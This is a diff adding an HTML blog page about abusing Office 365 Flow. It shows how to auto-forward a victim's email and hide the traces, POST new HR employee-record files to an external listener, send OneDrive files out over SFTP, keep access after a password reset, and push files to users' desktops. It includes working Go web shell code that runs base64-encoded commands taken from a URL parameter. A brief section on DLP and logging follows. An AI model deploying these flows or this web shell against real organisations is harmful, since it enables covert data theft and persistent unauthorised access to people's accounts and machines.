@@ -1,0 +1,236 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <script src="../static/js/nav.js"></script>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+  <link rel="stylesheet" href="../static/css/main.css">
+</head>
+<body>
+
+    <div class="site-wrapper">
+      <div id="mySidenav" class="sidenav" include-nav="/static/nav.html">
+        </div>
+        <span style="font-size:30px;cursor:pointer" onclick="openNav()">&#9776;</span>
+    
+        <div class="container">
+            <div class="blog-header">
+                <h1 class="blog-title">flow</h1>
+                <p class="lead blog-description">Office365's built in version of If This Then That (IFTT)</p>
+                <hr>
+              </div>
+        
+              <div class="row">
+        
+                <div class="col-sm-8 blog-main">
+                    <div class="blog-post" data-spy="scroll" data-target="#sidebar" data-offset="0">
+                        <h3 id="what_is_it">What is it?</h3>
+                        <p>Flow allows you to automate all kinds of things. The most powerful feature is how Flow is hooked into almost every single application within Office 365.</p>
+                        <p>Flow leverages 'Connectors' that allow applications to be easily connected together. Connectors consist of two parts; triggers and actions. Triggers are what start a flow and actions are the things that Flow is programed to do.</p>
+                        <p>For example, the flow below leverages the 'One Drive' connector with the 'When a file is created' trigger to detect when a file has been created in the Documents folder. WHen a new file is created it then moves on to the 'HTTP' connector and leverages the action to send a POST request to a web server.</p>
+                        <p>The HTTP connector pulls dynamic data from the One Drive connector so it can send the file name, file content, and other various attributes about the file to the listening web server.</p>
+                        <img src="../static/images/Office365/flow/flow_example.png" alt="Flow Example" style="width:100%">
+                        <hr>
+                        <h3 id="event_triggers">Event Triggers</h3>
+                        <p>As previously discussed event triggers are listeners. They are the things that kick off a flow.</p>
+                        <p>Some of the more dynamic and useful triggers are:
+                            <ul>
+                                <li>Request</li>
+                                <li>Email</li>
+                                <li>Schedule</li>
+                                <li>When document is created</li>
+                            </ul>
+                        </p>
+                        <h5>Request</h5>
+                        <p>The triggers within the Request connector is my favorite. The tirgger sets up a listening URL and accepts requests just like any other API. During the setup process a json schema is defined and all of the actions leverage data passed in through the API call. More details on this connector later.</p>
+                        <img src="../static/images/Office365/flow/blank_request.png" alt="Blank Request" style="width:100%">
+                        <h5>Email</h5>
+                        <p>The Office 365 Outlook triggers can start for a variety of reasons. Some are going to be more useful than others. One of the more useful things to do is to start the flow as soon as a new email arrives.</p>
+                        <img src="../static/images/Office365/flow/email_triggers.png" alt="Email Triggers" style="width:100%">
+                        <h5>Schedule</h5>
+                        <p>Much like it sounds the Schedule trigger will run based off a pre-defined time. Think of it as a cron job or a scheduled task within Office365. In the example below the trigger fires every 5 minutes. The trigger is fairly simple to setup. The only required fields are to define the interval and frequency. Within the advanced options, start time and time zone can be filled in.</p>
+                        <img src="../static/images/Office365/flow/schedule.png" alt="Schedule" style="width:100%">
+                        <h5>When a Document is Created</h5>
+                        <p>This trigger exsists for both OneDrive and for SharePoint. The trigger for OneDrive needs only a folder name.</p>
+                        <img src="../static/images/Office365/flow/onedrive_file_created.png" alt="OneDrive File Created" style="width:100%">
+                        <p>The trigger for SharePoint needsa  little more detail, but not much. This trigger needs a SharePoint site and the folder to monitor.</p>
+                        <img src="../static/images/Office365/flow/sharepoint_file_created.png" alt="SharePoint File Created" style="width:100%">
+                        <p>I feel its pertinent to add you can only access SharePoint sites and folders which you (or the account being leveraged) has access to.</p>
+                        <h5>Others</h5>
+                        <p>Other connectors you may find to have useful triggers:
+                            <ul>
+                                <li>Twitter - When a tweet is posted</li>
+                                <li>RSS - WHen a feed is published</li>
+                                <li>Gmail - WHen a new email arrives</li>
+                                <li>DropBox - When a file is created</li>
+                                <li>FTP - WHen a file is created</li>
+                                <li>Instagram - When new media is uploaded</li>
+                                <li>Google Contacts - When a contact is modified</li>
+                                <li>SQL - When an item is created</li>
+                                <li>and many, many, many more</li>
+                            </ul>
+                        </p>
+                        <hr>
+                        <h3 id="data_exfiltration">Data Exfiltration</h3>
+                        <p>Flow has hundreds of connectors. Many of them can be used for data exfiltration. With the help of a purpose built flow, data can be exfiltrated automatically. Below are a few examples that are designed to exfiltrate data.</p>
+                        <p>Keep in mind that these are just examples and they can be mixed and matched to meet whatever needs you may have.</p>
+                        <h5>Forward a Copy of All Emails</h5>
+                        <p>One popular way of persistent data exfiltration is to send a copy of all incoming emails to an outside email address by way of an outlook rule.</p>
+                        <p>This technique is popular enough that defenders are now keen to this methodology and make an active effort to check for and discover the malicious rules. Another way to accomplish this is to leverage Flow.</p>
+                        <p>The flow below takes an email that arrives in the 'Inbox' and sends it to an external address of our choice.</p>
+                        <img src="../static/images/Office365/flow/email_flow.png" alt="Email Flow" style="width:100%">
+                        <p>The next step of this flow shouldbe to delete the email from the sent folder. I'll let you figure out the best way to accomplish this.</p>
+                        <h5>New SharePoint File -> HTTP POST</h5>
+                        <p>Another way to move data out of an organization is by use the HTTP connector. The flow below leverages the SharePoint connector to act as the trigger when a file is created. The trigger is monitoring the jellypark SharePoint server, specifically the hr site.</p>
+                        <p>Within the site, the trigger is monitoring the employee-records folder. Any time a new file is created the flow begins and moves into the action section.</p>
+                        <p>This flows action is to use the HTTP connector to make a POST request to an external website (hxxps://listener.somelisteningwebsite.com). The body of the post request is very important. it is JSON data which contains two dynamic variables depending on the file created in the trigger.</p>
+                        <p>The value of the 'File name' variable is the name of the file created and the 'File Content' variable is filled with the contents of the file. All of this data is wrapped up into JSON so that when it arrives at the listener website it can be easily recontrusted.</p>
+                        <img src="../static/images/Office365/flow/sharepoint_http.png" alt="SharePoint HTTP" style="width:100%">
+                        <h5>New OneDrive File -> SFTP</h5>
+                        <p>Much like the SharePoint trigger waiting for a new file to be created within a folder, the OneDrive trigger for new file creation works the same way. When configuring the 'When a file is created' trigger the only option required is to set the folder to monitor.</p>
+                        <p>For the action portion of this flow we are going to leverage the SFTP connector to send the file to a remote server. Before we can use the connector the SFTP connection needs to be defined. This connection can be used for multiple flows. At minimum to establish the connection it needs:
+                            <ul>
+                                <li>A Name</li>
+                                <li>Server Address</li>
+                                <li>User Name</li>
+                            </ul>
+                        </p>
+                        <p>Other options such as port, password, and private key can also be defined. The image below shows an example SFTP connection.</p>
+                        <img src="../static/images/Office365/flow/sftp.png" alt="sftp" style="width:100%">
+                        <p>Upon clicking the 'Create' button Microsoft will validate the connection to make sure it works. If it fails to connect it will throw an error.</p>
+                        <p>Now that the connection is valid we can finish defining the 'Create file' action. The action requires a folder path on the remote server, a file name, and file content. File name and File content can both be dynamically generated based on the output from the trigger.</p>
+                        <p>Below is a fully functional flow that detects when a file is created in the root folder of the users OneDrive and then sends it to a remote server via SFTP.</p>
+                        <img src="../static/images/Office365/flow/onedrive_sftp.png" alt="SharePoint HTTP" style="width:100%">
+                        <hr>
+                        <h3 id="persistence">Persistence</h3>
+                        <p>In the previous section we covered some interesting ways to dynamically send data out of an organization. What if instead of dynamically sending data there was a desire to have more control over someones Office 365 account even if they change there password.</p>
+                        <p>The request trigger perfectly helps to facilitate this capability. Once completed the request trigger provides a URL that can be used to start the flow. The URL will looks similar to this one:</p>
+                        <pre><code>https://prod-57.westus.logic.azure.com:443/workflows/.../triggers/manual/paths/invoke?api-version=2016-06-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=...</code></pre>
+                        <p>The listener supports multiple request types including: Get, Put, Post, Patch, Delete. Custom request types can also be used.</p>
+                        <p>The listener is waiting for JSON data. The easiest thing that I've found is to paste in a sample JSON payload and let Flow automatically format it in a way that it understands.</p>
+                        <img src="../static/images/Office365/flow/rawjson.png" alt="Raw JSON" style="width:100%">
+                        <p>Doing it this way allows for Flow to understand and read the Keys and allow these fields to be select-able in the action triggers later within the flow. Flow will convert the JSON into something like this:</p>
+                        <img src="../static/images/Office365/flow/schema.png" alt="Schema" style="width:100%">
+                        <p>Now that the trigger is defined a connector needs built. For this example we're going to use the One Drive connector:</p>
+                        <img src="../static/images/Office365/flow/onedrive.png" alt="OneDrive" style="width:100%">
+                        <p>The variables are all defined based on the content that is passed from the JSON request. Once saved this Flow allows us to send a POST request to a custom Azure URL and based upon the data we pass in, it will create a file in one drive where ever we want it to go, with any name we want, and filled with our content.</p>
+                        <p>With the right connectors this allows an attacker to establish persistent access to pretty much someones entire Office 365 account. This access lives on after a password has been changed.</p>
+                        <hr>
+                        <h3 id="internal_network">Internal Network</h3>
+                        <p>Crossing the boundary from Office 365 to the internal network can be accomplished a couple of different ways with Flow. The next couple of sections cover how this can be accomplished.</p>
+                        <h5>OneDrive</h5>
+                        <p>The One Drive connector allows us to read and write files. In most enterprises the users profile is sync'd between One Drive and there local machine. By having access to One Drive we as attackers can write files directly to a users desktop.</p>
+                        <p>Once the files are in place a bit of social engineering and we have access to the internal network.</p>
+                        <h5>Data Gateway</h5>
+                        <p>Data Gateway's are fascinating...currently holding on releasing any additional information for personal reasons.</p>
+                        <img src="../static/images/Office365/flow/data_gateway.png" alt="Data Gateway" style="width:100%"><br />
+                        <br /><pre><code>package main
+
+import (
+    "encoding/base64"
+    "fmt"
+    "log"
+    "net/http"
+    "os/exec"
+    "strings"
+)
+
+func runCommand(w http.ResponseWriter, r *http.Request) {
+    //Get the Parameter
+    //expected url is http://url/?cmd=cHdk
+    b64cmd := r.URL.Query()["cmd"]
+    data := string(b64cmd[0])
+    //Decode the b64 string error
+    sDec, err := base64.StdEncoding.DecodeString(data)
+    if err != nil {
+        return
+    }
+    //stringify, split, and execute the command
+    cmd := string(sDec)
+    args := strings.Split(cmd, " ")
+    cmdOutput, err := exec.Command(args[0], args[1:]...).Output()
+    if err != nil {
+        //panic("ruh roh")
+        return
+    }
+    //return the output
+    fmt.Fprintf(w, string(cmdOutput))
+}
+
+//Set listening port, and handle incoming requests
+func handleRequests() {
+    http.HandleFunc("/", runCommand)
+    log.Fatal(http.ListenAndServe(":5000", nil))
+}
+
+func main() {
+    handleRequests()
+}</code></pre>
+                        <hr>
+                        <h3 id="security_controls">Security Controls</h3>
+                        <h5>Data Loss Prevention</h5>
+                        <p>Starting at the E3 license level Flow administrators have the ability to introduce DLP policies. These policies can be used to prevent various connectors from being paired together. The way it works is by classifying data at a high level. Connectors are split between 'Business Data Only' and 'No Business Data Allowed'.</p>
+                        <p>When people create new flows they will be unable to mix connectors from one group with connectors from the other.</p>
+                        <p>For example in the image below the OneDrive and SharePoint connectors can be used together but neither could be used the Salesforce or Dynamics 365 since they are in seperate groups.</p>
+                        <img src="../static/images/Office365/flow/dlp.png" alt="Data Loss Protection" style="width:100%"><br />
+                        <h5>Logging?</h5>
+                        <p>Good news, logging does exist. Bad news, its not the greatest. In the Office365 Admin 'Security & Compliance' portal there is an option to perform an audit log search. This search provides the ability to search logs across the entire Office 365 platform.</p>
+                        
+                        <hr>
+                        <h3 id="fun_nuances">Fun Nuances</h3>
+                        <hr>
+                    </div><!-- /.blog-post -->
+                </div><!-- /.blog-main -->
+
+                <!-- Blog Side Bar-->
+                <div class="col-sm-3 col-sm-offset-1 blog-sidebar" data-spy="affix" data-offset-top="10">
+                    <div class="sidebar-module">
+                        <nav id=sidebar>
+                            <nav class="nav nav-pills flex-column" >
+                                <a class="nav-link" href="#what_is_it">What is it</a>
+                                <a class="nav-link" href="#event_triggers">Event Triggers</a>
+                                <a class="nav-link" href="#data_exfiltration">Data Exfiltration</a>
+                                <a class="nav-link" href="#persistence">Persistence</a>
+                                <a class="nav-link" href="#internal_network">Internal Network</a>
+                                <a class="nav-link" href="#security_controls">Security Controls</a>
+                                <a class="nav-link" href="#fun_nuances">Fun Nuances</a>
+                            </nav>
+                        </nav>
+                    </div><!-- /.sidbar-module-->
+                </div><!-- /.blog-sidebar -->
+
+            </div><!-- /.row -->
+        </div> <!--/.container-->
+    </div> <!--/.wrapper -->
+
+
+
+
+<!-- Modals -->
+<div class="modal fade" id="redressing1Modal" tabindex="-1" role="dialog" aria-labelledby="redressing1ModalLabel" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+        <img src="../static/images/xssuiredressing1.png" style="width:300%;align-self:center;">
+    </div>
+  </div>
+</div>
+<div class="modal fade" id="redressing2Modal" tabindex="-1" role="dialog" aria-labelledby="redressing2ModalLabel" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+        <img src="../static/images/xssuiredressing2.png" style="width:300%;align-self:center;">
+    </div>
+  </div>
+</div>
+
+
+
+</body>
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+<script>includeHTML();</script>
+</html> 
+
